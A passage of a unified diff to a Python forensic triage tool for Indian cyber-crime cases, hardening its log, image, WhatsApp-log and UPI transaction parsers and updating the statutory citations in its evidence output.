@@ -52,12 +52,25 @@ Revision 2 (after the 2026-10-20 adversarial audit, 22 findings, each with a reg
     offsets stay exact with emoji and invalid bytes; malformed artifacts are listed in
     artifact_errors instead of aborting the run.
 
+Revision 3 (after the 2026-10-21 overnight audit; regression group "overnight audit"):
+    out-of-range dates (year 1 / 9999), NaN/Infinity/lone surrogates in JSONL, non-string event
+    fields, missing or truncated evidence files and bad extents are recorded as artifact errors
+    instead of aborting the run; corrupt JSONL lines are reported; BOM-marked UTF-8 and UTF-16LE
+    exports parse; '+0530' offsets parse on Python 3.10; naive-IST RRNs are not called invalid;
+    the Sector A manifest digest and the bound image's SHA-256 are verified; msgstore.db URIs are
+    percent-encoded; memory stays bounded for emoji-heavy text, gzip bombs, zero-width PGMs and
+    large logs; the PGM header and packages.xml extents are parsed without backtracking regexes;
+    concatenated and >4 MB-prefixed APK polyglots are found; smurfing/bridge matching is
+    time-indexed; anchors, the s.45 checklist and STUN entries use absolute offsets; the STR XML
+    is checked for well-formedness and cites Rule 8; B's freeze notice is a preliminary view that
+    defers to Sector D; verify_anchor and validate_manifest never raise.
+
 Dependencies: Python 3.10+ standard library only. numpy is used for the DFT/DCT
 when present; an ONNX model can be attached as an extra pre-filter when
 onnxruntime is present. Neither is needed, and neither can change a symbolic
 verdict.
 
-Statutes referenced: Sections 45 and 63 Bharatiya Sakshya Adhiniyam, 2023;
+Statutes referenced: Sections 39, 45 and 63 Bharatiya Sakshya Adhiniyam, 2023;
 Sections 94, 105 and 106 Bharatiya Nagarik Suraksha Sanhita, 2023; PMLA 2002;
 ISO/IEC 27037:2012; I4C CFCFRMS (1930).
 
@@ -66,9 +79,12 @@ Run `python sector_b_triage.py [workdir]` for the built-in self-test.
 
 from __future__ import annotations
 
+import array
 import base64
 import binascii
+import bisect
 import cmath
+import codecs
 import csv
 import datetime
 import functools
@@ -86,8 +102,11 @@ import sqlite3
 import struct
 import sys
 import time
+import tracemalloc
+import urllib.parse
 import zipfile
 import xml.etree.ElementTree as ET
+import xml.parsers.expat
 from zlib import error as zlib_error
 from collections import defaultdict
 from typing import Any, Dict, Iterable, Iterator, List, Optional, Sequence, Tuple
@@ -128,7 +147,7 @@ def _load_sector_a():
 _sector_a = _load_sector_a()
 
 TRIAGE_VERSION = "SUTRA-TRIAGE-2026.3-SUPREME"
-TRIAGE_REVISION = "r2"
+TRIAGE_REVISION = "r3"
 MANIFEST_FILENAME = "triage_manifest.json"
 LEAD_THRESHOLD = 0.50
 SECTOR_A_MANIFEST = getattr(_sector_a, "MANIFEST_FILENAME", "evidence_manifest.json")
@@ -137,7 +156,8 @@ ADMISSIBILITY_DOCTRINE = (
     "Threat scores are high-recall triage priorities only and are not offered as proof. "
     "Each lead is evidenced by its symbolic anchor: the byte range of the vaulted artifact it was "
     "derived from and that range's SHA-256, which can be re-computed independently of this software "
-    "(Section 63 BSA 2023 certificate; Section 45 BSA 2023 expert opinion).")
+    "(Section 63 BSA 2023 certificate; Section 39 BSA 2023 opinions of experts; "
+    "Section 45 BSA 2023 grounds of opinion).")
 
 
 # --------------------------------------------------------------------------- #
@@ -178,6 +198,28 @@ def _clean(s: str) -> str:
     return s.encode("utf-8", "replace").decode("utf-8")
 
 
+def _json_clean(v: Any) -> Any:
+    """_clean every string (keys too) of a parsed JSON value, e.g. '\\ud800' escapes from UTF-16 command lines."""
+    if isinstance(v, str):
+        return _clean(v)
+    if isinstance(v, dict):
+        return {_clean(k) if isinstance(k, str) else k: _json_clean(x) for k, x in v.items()}
+    if isinstance(v, list):
+        return [_json_clean(x) for x in v]
+    return v
+
+
+def _json_reject_constant(name: str) -> Any:
+    raise ValueError(f"non-finite JSON number {name}")
+
+
+def _json_finite_float(s: str) -> float:
+    x = float(s)
+    if not math.isfinite(x):
+        raise ValueError(f"non-finite JSON number {s[:24]}")
+    return x
+
+
 def noisy_or(weights: Iterable[float]) -> float:
     """Combine independent indicator weights: 1 - prod(1 - w)."""
     p = 1.0
@@ -201,58 +243,109 @@ def parse_timestamp(value: Any, default_tz: datetime.tzinfo = datetime.timezone.
     if isinstance(value, (int, float)):
         return float(value)
     s = str(value).strip()
-    if s.endswith("Z"):
+    if s.endswith(("Z", "z")):
         s = s[:-1] + "+00:00"
     if "T" not in s and " " in s:
         s = s.replace(" ", "T", 1)
     m = re.match(r"^(.*T\d{2}:\d{2}:\d{2})\.(\d+)(.*)$", s)
     if m:  # normalise fractional seconds to 6 digits for Python 3.10
         s = f"{m.group(1)}.{(m.group(2) + '000000')[:6]}{m.group(3)}"
+    # ISO-8601 basic offset '+0530' -> '+05:30': Python 3.10's fromisoformat only takes the extended form,
+    # 3.11+ takes both, so without this the Linux VM and the Windows box disagree on the same export.
+    s = re.sub(r"(T\d{2}:\d{2}(?::\d{2}(?:\.\d+)?)?)([+-]\d{2})(\d{2})$", r"\1\2:\3", s)
     dt = datetime.datetime.fromisoformat(s)
     if dt.tzinfo is None:
         dt = dt.replace(tzinfo=default_tz)
     return dt.timestamp()
 
 
+_EPOCH_UTC = datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc)
+
+
+def _utc_datetime(epoch: float) -> datetime.datetime:
+    """
+    Aware UTC datetime by pure arithmetic: no gmtime() call, so years before 1970 and after 3000 behave
+    the same on Windows (whose gmtime refuses them with OSError) and Linux. Raises ValueError /
+    OverflowError for NaN, Infinity and dates outside years 1..9999.
+    """
+    return _EPOCH_UTC + datetime.timedelta(seconds=epoch)
+
+
 def iso_utc(epoch: float) -> str:
-    dt = datetime.datetime.fromtimestamp(epoch, tz=datetime.timezone.utc)
-    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}Z"
+    """ISO-8601 UTC with milliseconds and a 4-digit zero-padded year (strftime('%Y') does not pad on glibc)."""
+    dt = _utc_datetime(epoch)
+    return (f"{dt.year:04d}-{dt.month:02d}-{dt.day:02d}T{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d}."
+            f"{dt.microsecond // 1000:03d}Z")
 
 
 def iter_lines(data: bytes) -> Iterator[Tuple[int, int, str]]:
-    """Yield (byte_offset, byte_length_without_newline, text) for each line of UTF-8 bytes."""
-    pos = 0
-    for raw in data.splitlines(keepends=True):
-        body = raw.rstrip(b"\r\n")
-        yield pos, len(body), body.decode("utf-8", "replace")
-        pos += len(raw)
+    """
+    Yield (byte_offset, byte_length_without_newline, text) for each line, lazily (no list of lines is
+    built). UTF-8 by default; a UTF-8 BOM is skipped and a UTF-16LE BOM (Windows PowerShell 5.1 '>'
+    redirects, Out-File) switches to UTF-16LE. Offsets are exact byte offsets in data either way.
+    Lines are decoded straight from a memoryview, so even one giant line is not copied twice.
+    """
+    n = len(data)
+    with memoryview(data) as mv:
+        if data[:2] == b"\xff\xfe":
+            end_all = n - ((n - 2) % 2)          # a dangling odd byte is not a code unit
+            pos = 2
+            while pos < end_all:
+                j = data.find(b"\n\x00", pos, end_all)
+                while j >= 0 and (j - pos) % 2:    # only a newline on a code-unit boundary
+                    j = data.find(b"\n\x00", j + 1, end_all)
+                nxt = end_all if j < 0 else j + 2
+                stop = end_all if j < 0 else j
+                if stop - pos >= 2 and data[stop - 2:stop] == b"\r\x00":
+                    stop -= 2
+                yield pos, stop - pos, str(mv[pos:stop], "utf-16-le", "replace")
+                pos = nxt
+            return
+        pos = 3 if data[:3] == b"\xef\xbb\xbf" else 0
+        j = -2   # cached position of the next LF (-1: none left), so CR-only files stay linear
+        while pos < n:
+            if j != -1 and j < pos:
+                j = data.find(b"\n", pos)
+            k = data.find(b"\r", pos, n if j < 0 else j)
+            if k >= 0:   # bare CR or CRLF ends the line (same line breaks as bytes.splitlines)
+                stop, nxt = k, (k + 2 if k + 1 < n and data[k + 1:k + 2] == b"\n" else k + 1)
+            elif j >= 0:
+                stop, nxt = j, j + 1
+            else:
+                stop, nxt = n, n
+            yield pos, stop - pos, str(mv[pos:stop], "utf-8", "replace")
+            pos = nxt
+
+
+_OFFSET_BLOCK = 256   # characters per checkpoint in decode_text_with_offsets
 
 
 def decode_text_with_offsets(data: bytes) -> Tuple[str, Any]:
     """
     Decode UTF-8 or BOM-marked UTF-16LE text; return (text, char_index -> byte_offset).
     Offsets are exact: supplementary characters (emoji) count 4 bytes in UTF-16LE, and each invalid
-    UTF-8 byte is kept as one surrogate-escaped character counting exactly 1 byte.
+    UTF-8 byte is kept as one surrogate-escaped character counting exactly 1 byte. Only one 8-byte
+    checkpoint per 256 characters is stored (the remainder is re-encoded on demand), so a 25 MB chat
+    export with one emoji no longer needs a Python int per character (about 45x the file size).
     """
     if data[:2] == b"\xff\xfe":
         body = data[2:len(data) - (len(data) % 2)]
         text = body.decode("utf-16-le", "surrogatepass")
-        base, width = 2, (lambda ch: 4 if ord(ch) > 0xFFFF else 2)
+        base, enc, errs = 2, "utf-16-le", "surrogatepass"
     else:
         text = data.decode("utf-8", "surrogateescape")
         if text.isascii():
             return text, (lambda i: i)
-        base = 0
+        base, enc, errs = 0, "utf-8", "surrogateescape"
+    k = _OFFSET_BLOCK
+    marks = array.array("q", [base])
+    for j in range(0, len(text), k):
+        marks.append(marks[-1] + len(text[j:j + k].encode(enc, errs)))
 
-        def width(ch: str) -> int:
-            o = ord(ch)
-            if 0xDC80 <= o <= 0xDCFF:  # surrogateescape: one original byte
-                return 1
-            return 1 if o < 0x80 else 2 if o < 0x800 else 3 if o < 0x10000 else 4
-    prefix = [base]
-    for ch in text:
-        prefix.append(prefix[-1] + width(ch))
-    return text, (lambda i: prefix[i])
+    def to_byte(i: int) -> int:
+        q = i // k
+        return marks[q] + len(text[q * k:i].encode(enc, errs))
+    return text, to_byte
 
 
 def shannon_entropy(s: str) -> float:
@@ -428,7 +521,7 @@ _B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{40,}={0,2}(?![A-Za-z0-
 
 
 def _basename(path: Optional[str]) -> str:
-    if not path:
+    if not path or not isinstance(path, str):   # a numeric/list/object Image field is not a path
         return ""
     return re.split(r"[\\/]", path.strip().strip('"'))[-1].lower()
 
@@ -576,44 +669,70 @@ class LogTriageEngine:
     # ----- event ingestion ------------------------------------------------- #
 
     @staticmethod
-    def parse_events_jsonl(data: bytes) -> List[Dict[str, Any]]:
-        """One JSON event per line (Sysmon 1 / Security 4688 / auditd exports); keeps each line's byte range."""
+    def parse_events_jsonl(data: bytes, errors: Optional[List[str]] = None) -> List[Dict[str, Any]]:
+        """
+        One JSON event per line (Sysmon 1 / Security 4688 / auditd exports); keeps each line's byte range.
+        JSONL is strict, so a line that is not one JSON object (corruption, NaN/Infinity/1e999, nesting
+        too deep) is skipped and reported in errors. Lone-surrogate escapes are replaced.
+        """
         events = []
         for off, length, text in iter_lines(data):
             if not text.strip():
                 continue
             try:
-                ev = json.loads(text)
-            except json.JSONDecodeError:
+                ev = json.loads(text, parse_constant=_json_reject_constant, parse_float=_json_finite_float)
+                if "\\u" in text:   # only an escape can produce a lone surrogate (iter_lines decodes with 'replace')
+                    ev = _json_clean(ev)
+            except (ValueError, RecursionError) as exc:   # JSONDecodeError is a ValueError
+                if errors is not None:
+                    errors.append(f"unparseable JSONL line at byte {off}: {type(exc).__name__}")
                 continue
             if not isinstance(ev, dict):
+                if errors is not None:
+                    errors.append(f"non-object JSON at byte {off}")
                 continue
+            # every event is kept for the Section 45 screen: share the key strings across events
+            # (about a third of an event's memory in a large Sysmon export)
+            ev = {sys.intern(k): v for k, v in ev.items()}
             normalize_event(ev)
             ev["_offset"], ev["_length"] = off, length
             events.append(ev)
         return events
 
     def triage_events(self, events: Sequence[Dict[str, Any]], artifact_id: str = "",
-                      threshold: float = LEAD_THRESHOLD) -> List[Dict[str, Any]]:
+                      threshold: float = LEAD_THRESHOLD, errors: Optional[List[str]] = None
+                      ) -> List[Dict[str, Any]]:
+        """Score every command-line event; one malformed record is reported in errors and skipped, not fatal."""
         leads = []
         for ev in events:
-            normalize_event(ev)
-            cmd = ev.get("command_line")
-            if not cmd or not isinstance(cmd, str):
+            try:
+                lead = self._triage_event(ev, artifact_id, threshold)
+            except Exception as exc:  # e.g. a field of an unexpected type: drop the record, keep the others
+                if errors is not None:
+                    errors.append(f"event at byte {ev.get('_offset', '?') if isinstance(ev, dict) else '?'} "
+                                  f"not triaged: {type(exc).__name__}: {exc}"[:300])
                 continue
-            res = self.analyze_command(cmd, ev.get("image"), ev.get("parent_image"))
-            if res["threat_score"] < threshold:
-                continue
-            families = {i["family"] for i in res["indicators"]}
-            category = ("LOLBINS_COMMAND" if families - {"lineage", "obfuscation", "entropy"}
-                        else "SUSPICIOUS_PROCESS_LINEAGE" if "lineage" in families else "OBFUSCATED_COMMAND")
-            res.update({"event_id": ev.get("event_id"), "timestamp_utc": ev.get("timestamp"),
-                        "user": ev.get("user"), "logon_type": ev.get("logon_type"),
-                        "host": ev.get("host")})
-            leads.append({"category": category, "score": res["threat_score"], "mitre": res["primary_mitre"],
-                          "details": res, "event": ev,
-                          "ref": evidence_ref(artifact_id, ev.get("_offset", 0), ev.get("_length", 0))})
+            if lead is not None:
+                leads.append(lead)
         return leads
+
+    def _triage_event(self, ev: Dict[str, Any], artifact_id: str, threshold: float) -> Optional[Dict[str, Any]]:
+        normalize_event(ev)
+        cmd = ev.get("command_line")
+        if not cmd or not isinstance(cmd, str):
+            return None
+        res = self.analyze_command(cmd, ev.get("image"), ev.get("parent_image"))
+        if res["threat_score"] < threshold:
+            return None
+        families = {i["family"] for i in res["indicators"]}
+        category = ("LOLBINS_COMMAND" if families - {"lineage", "obfuscation", "entropy"}
+                    else "SUSPICIOUS_PROCESS_LINEAGE" if "lineage" in families else "OBFUSCATED_COMMAND")
+        res.update({"event_id": ev.get("event_id"), "timestamp_utc": ev.get("timestamp"),
+                    "user": ev.get("user"), "logon_type": ev.get("logon_type"),
+                    "host": ev.get("host")})
+        return {"category": category, "score": res["threat_score"], "mitre": res["primary_mitre"],
+                "details": res, "event": ev,
+                "ref": evidence_ref(artifact_id, ev.get("_offset", 0), ev.get("_length", 0))}
 
     # ----- Section 45 BSA exculpatory checklist ---------------------------- #
 
@@ -722,7 +841,8 @@ class LogTriageEngine:
             rows.append({"check": cid, "question": question, "result": status})
         evaluated = attrib + intrusion
         return {
-            "statute": "Section 45, Bharatiya Sakshya Adhiniyam, 2023 (expert opinion) - Trojan-defence screen",
+            "statute": "Section 45, Bharatiya Sakshya Adhiniyam, 2023 (grounds of opinion) read with Section 39 "
+                       "(opinions of experts) - Trojan-defence screen",
             "target_timestamp_utc": iso_utc(t_target),
             "session_class": session,
             "logon_type": _to_int(target.get("logon_type")),
@@ -804,7 +924,7 @@ class LogTriageEngine:
 def _to_int(v: Any) -> Optional[int]:
     try:
         return int(v)
-    except (TypeError, ValueError):
+    except (TypeError, ValueError, OverflowError):   # OverflowError: int(float('inf'))
         return None
 
 
@@ -887,15 +1007,62 @@ def idct2(coef: Sequence[Sequence[float]]) -> List[List[float]]:
     return _matmul(_matmul(ct, [list(r) for r in coef]), c)
 
 
-def parse_pgm(data: bytes) -> Tuple[List[List[int]], int]:
-    """Binary PGM (P5, 8-bit). Returns (pixels, byte offset of the pixel block)."""
-    m = re.match(rb"P5\s+(?:#[^\n]*\s+)*(\d+)\s+(\d+)\s+(\d+)\s", data)
-    if not m or int(m.group(3)) > 255:
+_PGM_WS = b" \t\r\n\x0b\x0c"
+
+
+def _pgm_header(data: bytes) -> Tuple[int, int, int, int]:
+    """
+    Linear-time P5 header tokenizer (width, height, maxval, pixel offset). Replaces a regex whose
+    nested comment group backtracked exponentially on headers such as 'P5 # # # ... x'.
+    Comments ('#' to end of line) may appear wherever whitespace may; exactly one whitespace byte
+    follows maxval, as before.
+    """
+    if data[:2] != b"P5" or len(data) < 3 or data[2] not in _PGM_WS:
         raise ValueError("not an 8-bit binary PGM")
-    w, h, start = int(m.group(1)), int(m.group(2)), m.end()
-    px = data[start:start + w * h]
-    if len(px) != w * h:
+    pos, vals = 2, []
+    while len(vals) < 3:
+        gap = pos
+        while pos < len(data):
+            c = data[pos]
+            if c in _PGM_WS:
+                pos += 1
+            elif c == 0x23:  # '#': comment to end of line
+                nl = data.find(b"\n", pos)
+                if nl < 0:
+                    raise ValueError("not an 8-bit binary PGM")
+                pos = nl + 1
+            else:
+                break
+        start = pos
+        while pos < len(data) and 0x30 <= data[pos] <= 0x39 and pos - start <= 10:
+            pos += 1
+        if pos == start or pos == gap or pos - start > 10:
+            raise ValueError("not an 8-bit binary PGM")
+        vals.append(int(data[start:pos]))
+    if pos >= len(data) or data[pos] not in _PGM_WS:
+        raise ValueError("not an 8-bit binary PGM")
+    return vals[0], vals[1], vals[2], pos + 1
+
+
+def parse_pgm(data: bytes, crop: Optional[int] = None) -> Tuple[List[List[int]], int]:
+    """
+    Binary PGM (P5, 8-bit). Returns (pixels, byte offset of the pixel block). Zero or negative
+    dimensions are rejected and the pixel block must be present before anything is allocated. With
+    crop=N only the centre min(w, h, N) square is materialised (the same block analyze_spectrum
+    takes), so a large frame costs O(N^2) memory instead of a Python list per row.
+    """
+    w, h, maxval, start = _pgm_header(data)
+    if maxval > 255:
+        raise ValueError("not an 8-bit binary PGM")
+    if w <= 0 or h <= 0:
+        raise ValueError(f"PGM has a zero dimension ({w} x {h})")
+    if w * h > len(data) - start:
         raise ValueError("truncated PGM")
+    if crop is not None:
+        n = min(w, h, crop)
+        y0, x0 = (h - n) // 2, (w - n) // 2
+        return [list(data[start + (y0 + r) * w + x0:start + (y0 + r) * w + x0 + n]) for r in range(n)], start
+    px = data[start:start + w * h]
     return [list(px[r * w:(r + 1) * w]) for r in range(h)], start
 
 
@@ -1262,7 +1429,7 @@ class DeepfakeTriageEngine:
 
     # ----- WhatsApp WebRTC (victim handset) -------------------------------- #
 
-    MAX_LOG_BYTES = 256 * 1024 * 1024
+    MAX_LOG_BYTES = 64 * 1024 * 1024   # decompression cap for whatsapp.log.gz (logs rotate at a few MB)
 
     def parse_whatsapp_log(self, data: bytes, utc_offset_minutes: int = 330) -> Dict[str, Any]:
         """
@@ -1270,15 +1437,17 @@ class DeepfakeTriageEngine:
         are device-local; utc_offset_minutes converts them (IST = +330). IPv4, bracketed IPv6 and
         zone-scoped addresses are normalised. A truncated or oversized .gz yields what could be read
         plus an 'errors' entry; a malformed timestamp leaves that line's time empty.
-        Offsets refer to the bytes actually parsed (the decompressed text for .gz input).
+        Offsets refer to the bytes actually parsed (the decompressed text for .gz input). The
+        decompressed text is parsed in place (no second copy, no list of lines), so a gzip bomb costs
+        at most MAX_LOG_BYTES of memory.
         """
         errors: List[str] = []
         if data[:2] == b"\x1f\x8b":
             out = bytearray()
             try:
                 with gzip.GzipFile(fileobj=io.BytesIO(data)) as gz:
-                    while True:
-                        chunk = gz.read(1 << 20)
+                    while True:   # never read past the cap (+1 byte to detect that it was exceeded)
+                        chunk = gz.read(min(1 << 20, self.MAX_LOG_BYTES + 1 - len(out)))
                         if not chunk:
                             break
                         out.extend(chunk)
@@ -1288,7 +1457,7 @@ class DeepfakeTriageEngine:
                             break
             except (OSError, EOFError, zlib_error) as exc:
                 errors.append(f"gzip stream damaged after {len(out)} bytes: {type(exc).__name__}")
-            data = bytes(out)
+            data = out  # type: ignore[assignment]  # parsed in place: bytes(out) would double the peak
         tz = datetime.timezone(datetime.timedelta(minutes=utc_offset_minutes))
         candidates, servers, call_id = [], {}, None
         for off, length, line in iter_lines(data):
@@ -1305,7 +1474,8 @@ class DeepfakeTriageEngine:
             for sm in _STUN_URI.finditer(line):
                 key = f"{sm.group(1).lower()}:{sm.group(2)}:{sm.group(3) or ''}"
                 servers.setdefault(key, {"scheme": sm.group(1).lower(), "host": sm.group(2).strip("[]"),
-                                         "port": _to_int(sm.group(3)), "byte_offset": off})
+                                         "port": _to_int(sm.group(3)), "byte_offset": off, "length": length,
+                                         "line_sha256": _sha256_hex(data[off:off + length])})
             m = _ICE_CANDIDATE.search(line)
             if not m:
                 continue
@@ -1337,7 +1507,15 @@ class DeepfakeTriageEngine:
 
     @staticmethod
     def build_sec94_requisition(case_id: str, candidate: Dict[str, Any], window_s: int = 300) -> Dict[str, Any]:
-        t = parse_timestamp(candidate["timestamp_utc"]) if candidate.get("timestamp_utc") else None
+        """A timestamp that cannot bound a query window (unparseable, or year 1 minus 5 min) gives window None."""
+        t: Optional[float] = None
+        window: Optional[List[str]] = None
+        if candidate.get("timestamp_utc"):
+            try:
+                t = parse_timestamp(candidate["timestamp_utc"])
+                window = [iso_utc(t - window_s), iso_utc(t + window_s)]
+            except (ValueError, TypeError, OverflowError, OSError):
+                t, window = None, None
         req = {
             "statute": "Section 94, Bharatiya Nagarik Suraksha Sanhita, 2023 - summons to produce document or other thing",
             "case_reference": case_id,
@@ -1348,7 +1526,7 @@ class DeepfakeTriageEngine:
             "transport": candidate["transport"],
             "ice_candidate_type": candidate["type"],
             "observed_timestamp_utc": candidate.get("timestamp_utc"),
-            "query_window_utc": [iso_utc(t - window_s), iso_utc(t + window_s)] if t is not None else None,
+            "query_window_utc": window,
             "call_id": candidate.get("call_id"),
             "data_sought": [
                 "CGNAT / NAT translation log entry mapping the public IP and port to the internal IP for the window",
@@ -1360,15 +1538,28 @@ class DeepfakeTriageEngine:
         req["notice_text"] = (
             f"Under Section 94 BNSS 2023, in {case_id}, you are required to produce the CGNAT translation "
             f"record, subscriber details and IPDR for public IP {candidate['ip']} port {candidate['port']} "
-            f"({candidate['transport']}) between {req['query_window_utc'][0] if t else 'N/A'} and "
-            f"{req['query_window_utc'][1] if t else 'N/A'} UTC.")
+            f"({candidate['transport']}) between {window[0] if window else 'N/A'} and "
+            f"{window[1] if window else 'N/A'} UTC.")
         return req
+
+    @staticmethod
+    def msgstore_uri(db_path: str) -> str:
+        """
+        Read-only, immutable SQLite URI with the path percent-encoded, so '#', '%', '?' and spaces in a
+        case folder ('FIR #42') cannot cut off the mode=ro&immutable=1 query. Drive paths become
+        file:///C:/..., UNC paths file:////server/share/... (empty authority, which SQLite accepts).
+        """
+        p = os.path.abspath(db_path).replace("\\", "/")
+        if not p.startswith("/"):
+            p = "/" + p
+        return "file://" + urllib.parse.quote(p, safe="/:") + "?mode=ro&immutable=1"
 
     @staticmethod
     def parse_msgstore_calls(db_path: str) -> List[Dict[str, Any]]:
         """Read call_log rows from a WhatsApp msgstore.db copy (opened read-only, immutable)."""
-        uri = "file:" + os.path.abspath(db_path).replace("\\", "/") + "?mode=ro&immutable=1"
-        con = sqlite3.connect(uri, uri=True)
+        if not os.path.isfile(db_path):
+            raise FileNotFoundError(f"msgstore database not found: {db_path}")
+        con = sqlite3.connect(DeepfakeTriageEngine.msgstore_uri(db_path), uri=True)
         try:
             cols = [r[1] for r in con.execute("PRAGMA table_info(call_log)")]
             if not cols:
@@ -1380,7 +1571,10 @@ class DeepfakeTriageEngine:
             for row in rows:
                 d = dict(zip(want, row))
                 if "timestamp" in d and d["timestamp"]:
-                    d["timestamp_utc"] = iso_utc(d["timestamp"] / 1000.0)
+                    try:
+                        d["timestamp_utc"] = iso_utc(d["timestamp"] / 1000.0)
+                    except (ValueError, TypeError, OverflowError, OSError):
+                        d["timestamp_utc"] = None   # absurd or non-numeric call time: keep the row
                 out.append(d)
             return out
         finally:
@@ -1454,14 +1648,27 @@ class FinancialMuleDetector:
 
     # ----- NPCI RRN -------------------------------------------------------- #
 
-    def validate_rrn(self, rrn: Any, txn_epoch: Optional[float] = None) -> Dict[str, Any]:
+    def validate_rrn(self, rrn: Any, txn_epoch: Optional[float] = None, tz_naive: bool = False) -> Dict[str, Any]:
         """
         RRN = Y DDD HH SSSSSS (last digit of year, Julian day, IST hour, 6-digit STAN).
         With a transaction time, the year is the one nearest that time whose last digit is Y, and the
         RRN hour is turned into an absolute IST hour window: the transaction must fall within one hour
         of that window, so midnight, year-end and leap-day rollovers are not false alarms.
-        STAN 000000 is reserved and rejected.
+        STAN 000000 is reserved and rejected. A transaction time or inferred year outside years
+        1..9999 makes the RRN invalid with a reason instead of raising. tz_naive=True (a zone-less
+        bank timestamp read as UTC) also tries the IST reading of that time, as the bridge matcher
+        does, and records which reading fitted in timestamp_basis.
         """
+        res = self._validate_rrn(rrn, txn_epoch)
+        if tz_naive and txn_epoch is not None and not res["valid"] and _finite(txn_epoch):
+            alt = self._validate_rrn(rrn, float(txn_epoch) - self.IST_OFFSET_S)
+            if alt["valid"]:
+                return dict(alt, timestamp_basis="NAIVE_TIMESTAMP_READ_AS_IST")
+        if tz_naive and txn_epoch is not None:
+            res["timestamp_basis"] = "AS_RECORDED"
+        return res
+
+    def _validate_rrn(self, rrn: Any, txn_epoch: Optional[float] = None) -> Dict[str, Any]:
         s = str(rrn).strip()
         reasons: List[str] = []
         if not re.fullmatch(r"\d{12}", s):
@@ -1469,12 +1676,16 @@ class FinancialMuleDetector:
         y, ddd, hh, stan = int(s[0]), int(s[1:4]), int(s[4:6]), s[6:]
         ist = datetime.timezone(datetime.timedelta(minutes=330))
         txn_dt = None
+        anchor_year = self.reference_year
         if txn_epoch is not None and _finite(txn_epoch) and txn_epoch > 0:
-            txn_dt = datetime.datetime.fromtimestamp(txn_epoch, tz=ist)
-            anchor_year = txn_dt.year
-        else:
-            anchor_year = self.reference_year
-        year = min((anchor_year + k for k in range(-9, 10) if (anchor_year + k) % 10 == y),
+            try:
+                txn_dt = _utc_datetime(txn_epoch).astimezone(ist)   # no gmtime(): same on Windows
+                anchor_year = txn_dt.year
+            except (ValueError, OverflowError, OSError):
+                return {"rrn": s, "valid": False,
+                        "reasons": ["transaction time out of range (outside years 1..9999)"]}
+        year = min((anchor_year + k for k in range(-9, 10) if (anchor_year + k) % 10 == y
+                    and datetime.MINYEAR <= anchor_year + k <= datetime.MAXYEAR),
                    key=lambda yr: (abs(yr - anchor_year), -yr))
         leap = year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)
         if not 1 <= ddd <= (366 if leap else 365):
@@ -1485,9 +1696,14 @@ class FinancialMuleDetector:
             reasons.append("STAN 000000 is reserved")
         decoded = {"year_digit": y, "inferred_year": year, "julian_day": ddd, "hour": hh, "stan": stan}
         if not reasons:
-            start = datetime.datetime(year, 1, 1, tzinfo=ist) + datetime.timedelta(days=ddd - 1, hours=hh)
+            try:
+                start = datetime.datetime(year, 1, 1, tzinfo=ist) + datetime.timedelta(days=ddd - 1, hours=hh)
+                window = [iso_utc(start.timestamp()), iso_utc(start.timestamp() + 3600)]
+            except (ValueError, OverflowError, OSError):
+                reasons.append("transaction time / inferred year out of range")
+                return {"rrn": s, "valid": False, "reasons": reasons, "decoded": decoded}
             decoded["inferred_date"] = start.date().isoformat()
-            decoded["rrn_hour_window_utc"] = [iso_utc(start.timestamp()), iso_utc(start.timestamp() + 3600)]
+            decoded["rrn_hour_window_utc"] = window
             if txn_dt is not None:
                 t0 = start.timestamp()
                 if not (t0 - 3600 <= txn_epoch <= t0 + 2 * 3600):
@@ -1521,7 +1737,8 @@ class FinancialMuleDetector:
                 tz = (datetime.timezone(datetime.timedelta(minutes=330)) if "timestamp_ist" in r
                       else datetime.timezone.utc)
                 epoch = parse_timestamp(ts_raw, tz)
-            except (ValueError, TypeError, OverflowError):
+                ts_utc = iso_utc(epoch) if math.isfinite(epoch) else None   # inside the row's try: one bad
+            except (ValueError, TypeError, OverflowError, OSError):         # date drops one row, not the file
                 if errors is not None:
                     errors.append(f"bad timestamp or amount at byte {off}")
                 continue
@@ -1531,7 +1748,7 @@ class FinancialMuleDetector:
                 continue
             r[amount_key] = amount
             r["epoch"] = epoch
-            r["timestamp_utc"] = iso_utc(epoch)
+            r["timestamp_utc"] = ts_utc
             r["tz_naive"] = naive and "timestamp_ist" not in r
             r["_offset"], r["_length"] = off, length
             rows.append(r)
@@ -1563,13 +1780,32 @@ class FinancialMuleDetector:
         clean = [t for t in txns if _finite(t.get("epoch")) and t["epoch"] > 0 and _finite(t.get("amount_inr"))
                  and t["amount_inr"] > 0 and t.get("payer_vpa") and t.get("payee_vpa")]
         clean.sort(key=lambda t: (t["epoch"], str(t.get("txn_id", ""))))
+        # Time index per payer / payee (positions in 'clean', ascending), so each inflow only looks at
+        # its own hub's rows inside the window instead of rescanning every row (was O(n^2)).
+        by_payer: Dict[str, List[int]] = defaultdict(list)
+        by_payee: Dict[str, List[int]] = defaultdict(list)
+        for i, t in enumerate(clean):
+            by_payer[t["payer_vpa"].lower()].append(i)
+            by_payee[t["payee_vpa"].lower()].append(i)
+        ep_payer = {k: [float(clean[i]["epoch"]) for i in v] for k, v in by_payer.items()}
+        ep_payee = {k: [float(clean[i]["epoch"]) for i in v] for k, v in by_payee.items()}
+
+        def window(index: Dict[str, List[int]], eps: Dict[str, List[float]], key: str,
+                   lo: float, hi: float) -> List[Dict[str, Any]]:
+            """Rows of 'key' with lo <= epoch <= hi (a superset; callers re-test exactly), in 'clean' order."""
+            e = eps.get(key)
+            if not e:
+                return []
+            return [clean[i] for i in index[key][bisect.bisect_left(e, lo):bisect.bisect_right(e, hi)]]
+
         used: set = set()
         alerts = []
         for first in clean:
             if id(first) in used:
                 continue
             hub, t0 = first["payee_vpa"].lower(), first["epoch"]
-            outs = [t for t in clean if id(t) not in used and t["payer_vpa"].lower() == hub
+            outs = [t for t in window(by_payer, ep_payer, hub, t0, t0 + self.SMURF_WINDOW_S + 1.0)
+                    if id(t) not in used and t["payer_vpa"].lower() == hub
                     and 0 <= t["epoch"] - t0 <= self.SMURF_WINDOW_S]
             if not outs:
                 continue
@@ -1578,7 +1814,7 @@ class FinancialMuleDetector:
             total_in = first["amount_inr"]
             total_out = sum(t["amount_inr"] for t in outs)
             if total_out / total_in > self.SMURF_RATIO[1]:
-                for t in clean:
+                for t in window(by_payee, ep_payee, hub, t0, last_out):
